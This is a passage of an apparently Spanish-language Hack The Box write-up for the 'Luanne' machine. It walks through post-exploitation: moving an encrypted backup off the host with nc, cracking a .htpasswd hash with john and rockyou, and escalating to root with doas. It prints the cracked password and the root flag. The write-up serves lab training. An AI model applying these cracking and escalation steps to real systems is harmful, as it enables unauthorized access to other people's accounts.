+<p>Si listamos el directorio del usuario, obsevamos un directorio <code>backup</code>, que dentro contiene un archivo tar encrpytado.</p>
+
+<pre><code class="language-bash">luanne$ ls
+backups     devel       public_html user.txt
+luanne$ cd backups/                                                                                                                                                                   
+luanne$ ls 
+devel_backup-2020-09-16.tar.gz.enc
+</code></pre>
+
+<p>Ahora en <code>NETBSD</code>, existe una herramienta para decsencriptar estos archivos que corresponde ah <code>netpgp</code>. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente.</p>
+
+<pre><code class="language-bash">luanne$ netpgp
+NetPGP portable 3.99.17/[20101103]
+All bug reports, praise and chocolate, please, to:
+Alistair Crooks &lt;agc@netbsd.org&gt; c0596823
+Usage: netpgp COMMAND OPTIONS:
+netpgp  --help OR
+        --encrypt [--output=file] [options] files... OR
+        --decrypt [--output=file] [options] files... OR
+
+        --sign [--armor] [--detach] [--hash=alg] [--output=file]
+                [options] files... OR
+        --verify [options] files... OR
+        --cat [--output=file] [options] files... OR
+        --clearsign [--output=file] [options] files... OR
+        --list-packets [options] OR
+        --version
+where options are:
+        [--cipher=&lt;ciphername&gt;] AND/OR
+        [--coredumps] AND/OR
+        [--homedir=&lt;homedir&gt;] AND/OR
+        [--keyring=&lt;keyring&gt;] AND/OR
+        [--numtries=&lt;attempts&gt;] AND/OR
+        [--userid=&lt;userid&gt;] AND/OR
+        [--maxmemalloc=&lt;number of bytes&gt;] AND/OR
+        [--verbose]
+</code></pre>
+
+<p>Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con <code>python</code>, usaremos <code>nc</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua13.PNG" alt="" /></p>
+
+<p>Lo descomprimimos y dentro vemos otro archivo <code>.htpasswd</code>.</p>
+
+<pre><code class="language-bash">❯ ls
+ devel_backup-2020-09-16.tar.gz   id_rsa
+❯ file devel_backup-2020-09-16.tar.gz
+devel_backup-2020-09-16.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
+❯ tar -xf devel_backup-2020-09-16.tar.gz
+❯ ls
+ devel-2020-09-16   devel_backup-2020-09-16.tar.gz   id_rsa
+❯ cd devel-2020-09-16
+❯ ls
+ webapi   www
+❯ tree -fas
+.
+├── [         22]  ./webapi
+│   └── [       7072]  ./webapi/weather.lua
+└── [         38]  ./www
+    ├── [         47]  ./www/.htpasswd
+    └── [        378]  ./www/index.html
+
+2 directories, 3 files
+</code></pre>
+
+<p>Al leer el archivo, vemos una contraeña <code>hasheada</code>, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro <code>hash</code>.</p>
+
+<pre><code class="language-bash">❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littlebear       (webapi_user)
+1g 0:00:00:00 DONE (2023-06-29 18:21) 7.142g/s 93257p/s 93257c/s 93257C/s gamboa..hello11
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Obtenemos una nueva contraseña <code>littlebear</code>, que curiosamente corresponde a la del usuario <code>root</code>, pero para migrar no podemos hacer uso de <code>su root</code>, ya que en <code>NETBSD</code> lo hacemos usando el comando <code>doas</code>.</p>
+
+<pre><code class="language-bash">luanne$ su root 
+su: You are not listed in the correct secondary group (wheel) to su root.
+su: Sorry: Authentication error
+luanne$ doas sh
+Password:
+# whoami
+root
+</code></pre>
+
+<p>Finalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag <code>root.txt</code> y asi habriamos concluido.</p>
+
+<pre><code class="language-bash"># cd /root
+# cat root.txt
+7a9b5c206e8e8ba09bb99bd113675f66
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Luanne - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Luanne" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
